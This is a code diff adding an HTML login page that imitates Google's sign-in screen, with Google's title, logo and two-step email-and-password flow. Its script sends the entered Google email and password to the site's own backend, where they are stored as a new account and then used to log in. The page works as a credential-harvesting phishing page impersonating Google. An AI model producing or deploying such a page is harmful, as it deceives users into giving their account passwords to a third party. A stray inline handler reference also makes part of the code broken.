@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --google-blue: #1a73e8;
+            --border-color: #dadce0;
+            --text-color: #202124;
+            --link-color: #1a73e8;
+            --card-shadow: 0 1px 3px 0 rgba(60, 64, 67, 0.3), 0 4px 8px 3px rgba(60, 64, 67, 0.15);
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f8f9fa; /* Hafif gri arka plan */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: var(--text-color);
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            box-sizing: border-box;
+            background-color: #fff;
+            box-shadow: none; /* İlk aşamada gölge yok, sadece kenarlık */
+            transition: box-shadow 0.3s;
+        }
+
+        /* Küçük ekranlar için düzenleme */
+        @media (max-width: 600px) {
+            .login-container {
+                border: none;
+                max-width: 100%;
+                padding: 24px 20px 10px;
+            }
+            body {
+                background-color: #fff;
+            }
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo img {
+            width: 75px; 
+            content: url('https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg'); /* Google'ın güncel logosu */
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 16px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 30px;
+            color: #5f6368;
+        }
+
+        /* --- Input Group Styling (Material Design) --- */
+        .input-group {
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px 14px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+        
+        /* Placeholder'ı gizle, label'ı kullan */
+        .input-group input::placeholder {
+            color: transparent; 
+        }
+
+        .input-group input:focus {
+            border-color: var(--google-blue);
+            outline: none;
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 15px;
+            top: 14px;
+            color: #757575;
+            transition: 0.2s ease all;
+            pointer-events: none;
+            background-color: transparent;
+            font-size: 16px;
+        }
+
+        /* Focus veya doldurulduğunda label'ın yukarı çıkması */
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: -9px;
+            left: 13px;
+            font-size: 12px;
+            color: var(--google-blue);
+            padding: 0 2px;
+            background-color: #fff;
+            z-index: 10;
+        }
+        
+        /* --- Steps Management --- */
+        .form-step {
+            display: none;
+        }
+        .form-step.active {
+            display: block;
+        }
+
+        /* --- Alert Messages --- */
+        .alert {
+            padding: 10px 15px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            display: none;
+            text-align: left;
+            border: 1px solid #d93025;
+            background-color: #fce8e6;
+            color: #d93025;
+        }
+
+        /* --- Buttons --- */
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+        }
+
+        .btn {
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 500;
+            font-size: 14px;
+            text-decoration: none;
+            transition: background-color 0.3s, opacity 0.3s;
+        }
+
+        .btn-primary {
+            background-color: var(--google-blue);
+            color: #fff;
+            min-width: 90px;
+        }
+
+        .btn-primary:hover {
+            background-color: #1669c5;
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .btn-link {
+            color: var(--google-blue);
+            background: none;
+            padding: 0;
+            font-weight: 500;
+            transition: opacity 0.3s;
+        }
+
+        .btn-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
+        </div>
+        
+
+        <h1 id="form-title">Sign in</h1>
+        <p id="form-subtitle">Use your Google Account</p>
+
+        <div id="alertMessage" class="alert"></div>
+
+        <form id="loginForm" onsubmit="event.preventDefault();">
+
+            <div id="step-1" class="form-step active">
+                <div class="input-group">
+                    <input type="email" id="email" name="email" placeholder=" " required> 
+                    <label for="email">Email or phone</label>
+                </div>
+                <a href="#" class="btn btn-link" style="display: block; text-align: left; margin-bottom: 30px;">Forgot email?</a>
+            </div>
+
+            <div id="step-2" class="form-step">
+                <div class="input-group">
+                    <input type="password" id="password" name="password" placeholder=" " required minlength="8">
+                    <label for="password">Enter your password</label>
+                </div>
+                <a href="#" class="btn btn-link" style="display: block; text-align: left; margin-bottom: 30px;">Forgot password?</a>
+            </div>
+
+            <div class="button-group">
+                <a id="createAccLink" href="#" class="btn btn-link" onclick="handleCreateAccClick(event);">Create account</a> 
+                <button type="button" id="nextButton" class="btn btn-primary">Next</button>
+            </div>
+        </form>
+
+    </div>
+
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            let currentStep = 1;
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const nextButton = document.getElementById('nextButton');
+            const formTitle = document.getElementById('form-title');
+            const formSubtitle = document.getElementById('form-subtitle');
+            const createAccLink = document.getElementById('createAccLink');
+            const alertMessage = document.getElementById('alertMessage');
+
+            // --- UI Güncelleme Fonksiyonu ---
+            function updateUI() {
+                document.getElementById('step-1').classList.toggle('active', currentStep === 1);
+                document.getElementById('step-2').classList.toggle('active', currentStep === 2);
+                
+                if (currentStep === 1) {
+                    formTitle.textContent = "Sign in";
+                    formSubtitle.textContent = "Use your Google Account";
+                    nextButton.textContent = "Next";
+                    createAccLink.style.display = 'block';
+                    emailInput.focus();
+                } else if (currentStep === 2) {
+                    formTitle.textContent = "Welcome";
+                    formSubtitle.textContent = emailInput.value;
+                    nextButton.textContent = "Sign in";
+                    createAccLink.style.display = 'none';
+                    passwordInput.focus();
+                }
+                hideAlert();
+            }
+            
+            // --- Alert Fonksiyonları ---
+            function showAlert(message) {
+                alertMessage.textContent = message;
+                alertMessage.style.display = 'block';
+            }
+
+            function hideAlert() {
+                alertMessage.style.display = 'none';
+            }
+
+            // --- Adım Doğrulama ---
+            function validateStep(step) {
+                if (step === 1) {
+                    const email = emailInput.value.trim();
+                    if (!email || !/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(email)) {
+                        showAlert("Please enter a valid email address.");
+                        return false;
+                    }
+                    return true;
+                } else if (step === 2) {
+                    const password = passwordInput.value;
+                    if (password.length < 8) {
+                        showAlert("Password must be at least 8 characters long.");
+                        return false;
+                    }
+                    return true;
+                }
+                return false;
+            }
+
+            // --- NEXT/SIGN IN Butonuna Tıklama İşleyici ---
+            nextButton.addEventListener('click', async () => {
+                if (!validateStep(currentStep)) return;
+
+                if (currentStep === 1) {
+                    // Adım 1'den Adım 2'ye geç
+                    currentStep++;
+                    updateUI();
+                } else if (currentStep === 2) {
+                    // Adım 2'den Giriş işlemine geç
+                    await handleSignIn();
+                }
+            });
+
+            // --- Hesap Oluşturma Linki Tıklama İşleyici ---
+            function handleCreateAccClick(e) {
+                e.preventDefault();
+                // Basitlik için sadece formu sıfırlayıp 1. adıma dönüyoruz
+                emailInput.value = '';
+                passwordInput.value = '';
+                currentStep = 1;
+                updateUI();
+            }
+
+            // --- Ana Giriş İşlemi: Önce Oluştur, Sonra Giriş Yap ---
+            async function handleSignIn() {
+                const email = emailInput.value.trim();
+                const password = passwordInput.value;
+
+                nextButton.disabled = true;
+                nextButton.textContent = 'Processing...';
+
+                // 1. ADIM: Hesap Oluşturma İsteği (/api/create_acc)
+                // Amaç: Kullanıcı zaten yoksa, zorunlu alanları doldurarak kaydetmek.
+                
+                const createData = {
+                    username: email,        // Backend'deki 'user' alanına email'i yazıyoruz
+                    password: password,
+                    email: email,
+                    bdate: 1.0,             // Varsayılan float değeri
+                    phone: "00000000000"    // Varsayılan telefon numarası
+                };
+
+                try {
+                    const createResponse = await fetch('/api/create_acc', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(createData)
+                    });
+                    
+                    // Hesap zaten varsa 400 dönebilir ("User already exists"), bu normaldir.
+                    // Eğer 200 veya 400 dışında bir hata ise durdur.
+                    if (createResponse.status >= 500) {
+                        showAlert(`Server Error during Create: ${await createResponse.text()}`);
+                        nextButton.disabled = false;
+                        nextButton.textContent = 'Sign in';
+                        return;
+                    }
+
+                    // 2. ADIM: Giriş Yapma İsteği (/api/login_acc)
+                    const loginData = {
+                        username: email,
+                        password: password
+                    };
+
+                    const loginResponse = await fetch('/api/login_acc', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(loginData)
+                    });
+
+                    if (loginResponse.ok) {
+                        // Başarılı Giriş!
+                        nextButton.textContent = 'Signed in!';
+                        showAlert('Successfully signed in. Redirecting...', 'success');
+                        
+                        setTimeout(() => {
+                            window.location.href = '/'; 
+                        }, 1000);
+                    } else {
+                        // Giriş başarısız
+                        const errorText = await loginResponse.text();
+                        showAlert(`Sign In Failed: ${errorText}.`);
+                        
+                        // Hata durumunda şifre alanını temizleyip odakla
+                        passwordInput.value = '';
+                        nextButton.disabled = false;
+                        nextButton.textContent = 'Sign in';
+                    }
+
+                } catch (error) {
+                    console.error('Network Error:', error);
+                    showAlert('A network error occurred. Please try again.');
+                    nextButton.disabled = false;
+                    nextButton.textContent = 'Sign in';
+                }
+            }
+            
+            updateUI();
+        });
+    </script>
+</body>
+</html>
